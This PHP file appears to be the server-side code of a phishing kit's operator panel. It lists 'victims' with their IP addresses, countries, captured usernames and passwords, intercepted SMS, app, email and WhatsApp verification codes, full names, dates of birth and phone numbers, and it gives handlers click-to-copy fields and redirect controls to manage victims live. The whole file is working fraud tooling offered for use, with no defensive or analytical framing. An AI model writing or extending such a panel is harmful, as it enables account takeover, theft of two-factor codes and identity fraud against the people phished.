<?php
include 'config.php';
include 'connect.php';
date_default_timezone_set('Europe/Dublin');
session_start();

if (!isset($_SESSION['loggedin'])) {
    http_response_code(403);
    exit(json_encode(['error' => 'Unauthorized access']));
}

// Update handler's last seen timestamp
if ($_SESSION['role'] === "Handler") {
    $stmt = $conn->prepare("UPDATE handlers SET lastseen = ? WHERE username = ?");
    $new_lastseen = time();
    $stmt->bind_param('is', $new_lastseen, $_SESSION['username']);
    $stmt->execute();
    $stmt->close();
}

// Function to generate victim HTML row
function generateVictimRow($value) {
    $badge = status_to_badge($value['status'], "status.json");
    $lastseen = check_online($value['lastseen']);
    $lastseen = "<td style='vertical-align:middle;'>$lastseen</td>";

    // Assigning all the values to variables with clickable fields handled
$columns = [
    'id' => "<td class='pro-font' style='vertical-align:middle; color: white; font-size: 14px; font-weight: 500;' scope='row'>{$value['id']}</td>",
    'handler' => "<td class='pro-font' style='vertical-align:middle; color: white; font-size: 14px; font-weight: 500;'>{$value['handler']}</td>",
    'ip' => "<td class='pro-font' style='vertical-align:middle; color: white; font-size: 14px;'>{$value['ip']}</td>",
    'useragent' => "<td class='pro-font' style='vertical-align:middle; text-align: center; color: white; font-size: 14px; font-weight: 500;'>" . useragent_to_browser($value['useragent']) . "</td>",
    'country' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 14px; font-weight: 500;' title='Click to copy'>{$value['country']}</td>",
    'user' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px; font-weight: 500;' title='Click to copy'>{$value['user']}</td>",
    'pass' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['pass']}</td>",
    'smscode' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['smscode']}</td>",
    'appcode' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['appcode']}</td>",
    'emailcode' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['emailcode']}</td>",
    'whatsappcode' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['whatsappcode']}</td>",
    'reviewlogin' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['reviewlogin']}</td>",
    'reviewtransaction' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['reviewtransaction']}</td>",
    'securityhold' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['securityhold']}</td>",
    'emailstart' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['emailstart']}</td>",
    'business_name' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['business_name']}</td>",
    'confirm' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['confirm']}</td>",
    'description' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['description']}</td>",
    'fullname' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['fullname']}</td>",
    'dob' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['dob']}</td>",
    'phonenumber' => "<td class='pro-font' data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: white; font-size: 15px;' title='Click to copy'>{$value['phonenumber']}</td>",

   'status' => "<td class='pro-font' style='white-space: nowrap; vertical-align:middle; color: white; font-size: 15px;'>$badge</td>"
];



    // Combine all the columns in the original order
    $rowHtml = $columns['id'] . $lastseen . $columns['ip'] . 
               $columns['country'] . $columns['description'] . $columns['user'] . $columns['pass'] . $columns['confirm'] . $columns['fullname'] . $columns['dob'] . $columns['phonenumber'] . $columns['status'];           

    return $rowHtml;
}

// Combined Query: Fetch all clients and mark removed ones
$stmt = $conn->prepare("SELECT * FROM clients");
$stmt->execute();
$result = $stmt->get_result();

$output = [];
$removed_ids = [];

while ($value = $result->fetch_assoc()) {
    if ($value['is_removed'] == 1) {
        $removed_ids[] = $value['id'];
    } else {
        $rowHtml = generateVictimRow($value);
        $output[] = [
            'id' => 'row' . $value['id'],
            'redirects' => redirects_btn($value['status'], "status.json"),
            'buzzed' => $value['buzzed'],
            'info' => base64_encode($rowHtml)
        ];
    }
}
$stmt->close();

// Return the JSON response
echo json_encode([
    'total_visits' => total_visits($conn),
    'total_clients' => total_clients($conn),
    'online_clients' => online_clients($conn),
    'active_handlers' => online_handlers($conn),
    'removed_ids' => $removed_ids,
    'clients' => $output
]);
?>
